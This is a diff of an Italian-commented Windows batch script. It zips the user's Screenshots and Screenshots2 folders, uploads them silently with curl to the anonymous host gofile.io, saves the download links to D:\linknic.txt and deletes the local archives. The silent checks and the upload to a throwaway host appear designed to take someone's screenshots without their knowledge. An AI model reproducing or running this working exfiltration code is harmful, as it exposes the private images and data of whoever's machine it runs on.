@@ -2,40 +2,62 @@ yes;@echo off
 setlocal
 
 :: Percorsi
-set "SRC=%USERPROFILE%\Pictures\Screenshots"
-set "TMPZIP=%TEMP%\screenshots.zip"
+set "SRC1=%USERPROFILE%\Pictures\Screenshots"
+set "SRC2=%USERPROFILE%\Pictures\Screenshots2"
+set "TMPZIP1=%TEMP%\Screenshots.zip"
+set "TMPZIP2=%TEMP%\Screenshots2.zip"
 set "DEST=D:\linknic.txt"
 
 :: Verifica se D:\ esiste
 if not exist D:\ exit /b
 
-:: Verifica se la cartella Screenshots esiste
-if not exist "%SRC%" exit /b
+:: Verifica se le cartelle Screenshots e Screenshots2 esistono
+if not exist "%SRC1%" exit /b
+if not exist "%SRC2%" exit /b
 
-:: Crea lo ZIP
-powershell -Command "Compress-Archive -Path '%SRC%\*' -DestinationPath '%TMPZIP%' -Force"
+:: Crea lo ZIP per il primo file
+powershell -Command "Compress-Archive -Path '%SRC1%\*' -DestinationPath '%TMPZIP1%' -Force"
 
-:: Invia a GoFile.io e ottieni il link
-for /f "delims=" %%i in ('curl -s -F "file=@%TMPZIP%" https://gofile.io/uploadFile') do (
-    set "RESPONSE=%%i"
+:: Crea lo ZIP per il secondo file
+powershell -Command "Compress-Archive -Path '%SRC2%\*' -DestinationPath '%TMPZIP2%' -Force"
+
+:: Carica il primo file ZIP su GoFile.io e ottieni il link
+for /f "delims=" %%i in ('curl -s -F "file=@%TMPZIP1%" https://gofile.io/uploadFile') do (
+    set "RESPONSE1=%%i"
 )
 
-:: Estrai il link dal JSON di risposta
-for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE% ^| findstr "downloadPage"') do (
-    set "LINK=%%~a"
+:: Carica il secondo file ZIP su GoFile.io e ottieni il link
+for /f "delims=" %%i in ('curl -s -F "file=@%TMPZIP2%" https://gofile.io/uploadFile') do (
+    set "RESPONSE2=%%i"
 )
 
-:: Pulisci virgolette e spazi
-set "LINK=%LINK:"=%"
-set "LINK=%LINK:~1,-1%"
+:: Estrai il link per il primo file dal JSON di risposta
+for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE1% ^| findstr "downloadPage"') do (
+    set "LINK1=%%~a"
+)
 
-:: Se il link è valido, salvalo su D:\linknic.txt
-if defined LINK (
-    echo %LINK% > D:\linknic.txt
+:: Estrai il link per il secondo file dal JSON di risposta
+for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE2% ^| findstr "downloadPage"') do (
+    set "LINK2=%%~a"
+)
+
+:: Pulisci virgolette e spazi per entrambi i link
+set "LINK1=%LINK1:"=%"
+set "LINK2=%LINK2:"=%"
+set "LINK1=%LINK1:~1,-1%"
+set "LINK2=%LINK2:~1,-1%"
+
+:: Se entrambi i link sono validi, salvali su D:\linknic.txt
+if defined LINK1 (
+    echo Primo link: %LINK1% >> D:\linknic.txt
+)
+if defined LINK2 (
+    echo Secondo link: %LINK2% >> D:\linknic.txt
 )
 
 :: Pulizia
-del "%TMPZIP%"
-exit /b
+del "%TMPZIP1%"
+del "%TMPZIP2%"
 
+exit /b
 
